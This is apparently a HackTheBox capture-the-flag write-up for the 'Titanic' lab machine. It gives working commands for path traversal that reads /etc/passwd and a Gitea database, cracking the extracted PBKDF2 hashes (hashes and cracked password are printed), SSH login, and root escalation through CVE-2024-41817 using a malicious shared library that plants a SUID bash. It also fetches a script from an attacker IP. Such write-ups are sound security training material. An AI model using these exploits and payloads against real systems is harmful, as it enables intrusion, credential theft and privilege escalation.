# Titanic — HackTheBox Writeup

**Difficulty:** Easy
**OS:** Linux
**IP:** 10.129.x.x  <!-- target IP -->

---

## Table of Contents

1. [Reconnaissance](#1-reconnaissance)
2. [Path Traversal — Ticket Download](#2-path-traversal--ticket-download)
3. [Gitea Database Extraction](#3-gitea-database-extraction)
4. [Hash Cracking](#4-hash-cracking)
5. [Initial Access — SSH](#5-initial-access--ssh)
6. [Privilege Escalation — ImageMagick CVE-2024-41817](#6-privilege-escalation--imagemagick-cve-2024-41817)

---

## 1. Reconnaissance

### TCP Scan
```bash
nmap -T4 -sV -Pn -n 10.129.x.x -v -sC  # target IP
```

**Results:**
- Port 22 — OpenSSH
- Port 80 — HTTP

The web server redirected to `titanic.htb`. Added it to `/etc/hosts`:
```bash
echo "10.129.x.x titanic.htb" >> /etc/hosts  # target IP
```

### Web Enumeration

Browsing to `titanic.htb` revealed a ship booking website with:
- A trip booking form (Full Name, Email, Phone, Travel Date, Cabin Type)
- After submitting, a `.json` ticket file gets downloaded with the booking details
- Static pages: Home, About, Services, Contact

Ran vhost fuzzing and discovered a second virtual host:
```bash
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt \
  -u http://titanic.htb -H "Host: FUZZ.titanic.htb"
```

Found `dev.titanic.htb` — added to `/etc/hosts`:
```bash
echo "10.129.x.x dev.titanic.htb" >> /etc/hosts  # target IP
```

`dev.titanic.htb` hosted a **Gitea** instance (self-hosted Git service). Directory fuzzing on this subdomain revealed a `/developer` path containing a `docker-compose.yml` with MySQL credentials — noted for later.

> **Key Takeaway:** Always check for virtual hosts. Two completely different applications were running on the same IP — the main site was the attack surface, the dev subdomain exposed internal tooling.

---

## 2. Path Traversal — Ticket Download

### Identifying the Vulnerability

While capturing all requests in Burp Suite HTTP history, after submitting the booking form the app issued this request:
```
GET /download?ticket=<uuid>.json HTTP/1.1
Host: titanic.htb
```

The `ticket` parameter directly reads a filename from disk with no sanitization — a classic **path traversal** vulnerability.

### Verification

In Burp Repeater, replaced the ticket value with `/etc/passwd`:
```
GET /download?ticket=/etc/passwd HTTP/1.1
Host: titanic.htb
```

This returned the full contents of `/etc/passwd`, confirming the vulnerability.

Notable users with login shells:
- `root` — `/bin/bash`
- `developer` — `/bin/bash`

> **Key Takeaway:** Any time you see a parameter that looks like a filename (ticket, file, path, doc, page), immediately try path traversal. The `/download?ticket=` pattern is a textbook example.

---

## 3. Gitea Database Extraction

### Finding the Database Path

Since `dev.titanic.htb` was running Gitea and Gitea uses SQLite by default, the goal was to find the exact database path on disk.

The `docker-compose.yml` found earlier showed the volume mount:
```yaml
volumes:
  - /home/developer/gitea/data:/data
```

Gitea stores its database at `/data/gitea/gitea.db` inside the container. Mapping through the volume mount gives the host path:
```
/home/developer/gitea/data/gitea/gitea.db
```

### Downloading the Database via Path Traversal
```bash
curl 'http://titanic.htb/download?ticket=/home/developer/gitea/data/gitea/gitea.db' -o gitea.db
```

### Extracting Password Hashes

Opened the database with sqlite3:
```bash
sqlite3 gitea.db
sqlite> select * from user;
```

Three users found: `administrator`, `developer`, `test`. The hash format was `pbkdf2$50000$50` — PBKDF2-HMAC-SHA256 with 50000 iterations.

Used `gitea2hashcat.py` to convert the hashes into hashcat-compatible format:
```bash
sqlite3 gitea.db 'select salt,passwd from user;' | python3 gitea2hashcat.py
```

**Output:**
```
[+] Run the output hashes through hashcat mode 10900 (PBKDF2-HMAC-SHA256)

sha256:50000:LRSeX70bIM8x2z48aij8mw==:y6IMz5J9OtBWe2gWFzLT+8oJjOiGu8kjtAYqOWDUWcCNLfwGOyQGrJIHyYDEfF0BcTY=
sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=
sha256:50000:WmN1csngQLtvEk+KMPQ5tw==:OHKGkkkVw01rnBVBODBb9a+mXvbXcnsG6w9TlH4Y41+E2+vokxcVRTtISb/QNRSFW3c=
```

Saved all three hashes to `hash.txt`.

---

## 4. Hash Cracking
```bash
hashcat -m 10900 hash.txt /usr/share/wordlists/rockyou.txt
```

**Result:**
```
sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=:25282528
```

Cracked hash belonged to the `developer` user. Password: `25282528`

> **Note:** PBKDF2 with 50000 iterations is slow on CPU. The other two hashes did not crack with rockyou. Only the developer hash was needed to proceed.

---

## 5. Initial Access — SSH

Used the cracked credentials to SSH in as `developer`:
```bash
ssh developer@10.129.x.x  # target IP
# password: 25282528
```

**Grabbed user flag:**
```bash
cat ~/user.txt
```

---

## 6. Privilege Escalation — ImageMagick CVE-2024-41817

### System Enumeration

Downloaded and ran LinEnum for general enumeration:
```bash
wget http://10.10.x.x:9090/LinEnum.sh  # attacker IP
chmod +x LinEnum.sh
./LinEnum.sh
```

Checked `/opt/` manually:
```bash
ls -al /opt/
```

**Output:**
```
drwxr-xr-x 5 root developer 4096 Feb 7 10:37 app
drwx--x--x 4 root root      4096 Feb 7 10:37 containerd
drwxr-xr-x 2 root root      4096 Feb 7 10:37 scripts
```

`/opt/app` is group-owned by `developer`. Found a script at `/opt/scripts/identify_images.sh`:
```bash
cat /opt/scripts/identify_images.sh
```

**Contents:**
```bash
cd /opt/app/static/assets/images
truncate -s 0 metadata.log
find /opt/app/static/assets/images/ -type f -name "*.jpg" | xargs /usr/bin/magick identify >> metadata.log
```

This script runs `magick identify` on all `.jpg` files in the images folder. Checking the `metadata.log` timestamp showed it was being **updated every minute** — root was running this via a cron job.

### Checking Write Access
```bash
find /opt/app -type d -perm 770
```

**Output:**
```
/opt/app/static/assets/images
/opt/app/tickets
```

Write access confirmed on the images folder — exactly where the script runs from.

### Identifying the Vulnerability
```bash
magick --version
```

**Output:**
```
Version: ImageMagick 7.1.1-35
```

Searching for `ImageMagick 7.1.1-35 exploit` revealed **CVE-2024-41817** — an arbitrary code execution vulnerability where ImageMagick loads shared libraries from the **current working directory before system paths**.

This means placing a malicious `.so` file in `/opt/app/static/assets/images` will cause root to load and execute our code when magick runs.

### Exploit

**Step 1 — Compile malicious shared library in the images directory:**
```bash
cd /opt/app/static/assets/images

gcc -x c -shared -fPIC -o libxcb.so.1 - << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void init() {
    system("cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash");
}
EOF
```

**What this does:**
- Compiles a shared library named `libxcb.so.1` — a name ImageMagick tries to load
- `__attribute__((constructor))` makes the function execute automatically when the library is loaded
- The payload copies bash to `/tmp/rootbash` and sets the SUID bit so it runs as root

**Step 2 — Wait ~1 minute for the cron job to trigger**

Root's cron runs `magick identify` from that directory, finds `libxcb.so.1` in the current directory first (due to the vulnerability), and the constructor function executes as root — creating `/tmp/rootbash` with the SUID bit set.

**Step 3 — Execute the SUID bash:**
```bash
/tmp/rootbash -p
```

The `-p` flag preserves elevated privileges instead of dropping them, giving a root shell.

**Grabbed root flag:**
```bash
cat /root/root.txt
```

### Why This Works
```
cron runs magick as root in /opt/app/static/assets/images
        ↓
magick searches current directory for shared libraries FIRST
        ↓
finds our malicious libxcb.so.1
        ↓
loads it → constructor runs automatically as root
        ↓
cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash
        ↓
/tmp/rootbash -p → root shell
```
